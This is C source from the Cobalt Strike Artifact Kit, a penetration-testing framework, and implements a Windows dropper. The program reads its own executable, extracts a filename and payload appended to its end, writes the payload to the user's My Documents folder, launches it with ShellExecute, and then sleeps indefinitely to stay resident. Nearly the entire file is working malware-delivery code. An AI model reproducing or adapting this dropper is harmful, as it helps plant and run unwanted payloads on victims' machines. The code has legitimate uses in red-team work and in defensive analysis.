/*
 * Cobalt Strike Artifact Kit
 *
 * (c) 2013 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * This is a dropper... a favorite malware activity
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <io.h>
#include <shlobj.h>

void start(HINSTANCE handle);
char * ddata = "DROPPER!";

typedef struct {
	int  filenam_len;
	int  dropper_len;
} offsets;

void dropper() {
	offsets * patch = (offsets *)ddata;
	char lbuffer[1024];
	int read = 0;
	int program_len;  /* size of this executable (could change when user changes icon) */
	int name_off = 0; /* offset of null-byte terminated filename in this executable */
	int data_off = 0; /* offset of drop file data in this executable */

	/* find this executable file */
	char * name = (char *)malloc(sizeof(char) * 2048);
	GetModuleFileNameA(NULL, name, sizeof(char) * 2048);

	/* open this file up */
	FILE * handle = fopen(name, "rb");
	if (handle == NULL)
		return;

	/* seek to the end... to get file size. */
	if (fseek(handle, 0 , SEEK_END) != 0)
		return;

	/* tell me... the size of this file */
	program_len = ftell(handle);
	if (program_len <= 0)
		return;

	/* let's do it again! */
	fclose(handle);

	handle = fopen(name, "rb");
	if (handle == NULL)
		return;

	/* read all of our data in plz */
	char * buffer = (char *)malloc(program_len);
	while (read < program_len)
		read += fread((char *)buffer + read, 1, program_len - read, handle);

	fclose(handle);

	/* buffer layout is this:
	 *
	 * '-program_len---------------------------'
	 *              'filenam_len-''dropper_len-'
	 * [executable ][filename][00][file content]
	 */

	name_off = program_len - (patch->filenam_len + patch->dropper_len);
	data_off = program_len - patch->dropper_len;

	/* calculate "My Documents" folder in a language neutral way */
	if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL|CSIDL_FLAG_CREATE, NULL, 0, lbuffer)))
		return;

	_snprintf(name, 2048, "%s\\%s", lbuffer, buffer + name_off);

	/* write out the file */
	handle = fopen(name, "wb");
	if (handle == NULL)
		return;

	fwrite((char *)buffer + data_off, 1, patch->dropper_len, handle);
	fclose(handle);

	/* call shellexecute to spawn it */
	ShellExecute(NULL, NULL, name, NULL, NULL, SW_SHOW | SW_SHOWNORMAL);
}

int main(int argc, char * argv[]) {
	start(NULL);
	dropper();

	/* sleep so we don't exit */
	while (TRUE)
		Sleep(60 * 1000);

	return 0;
}
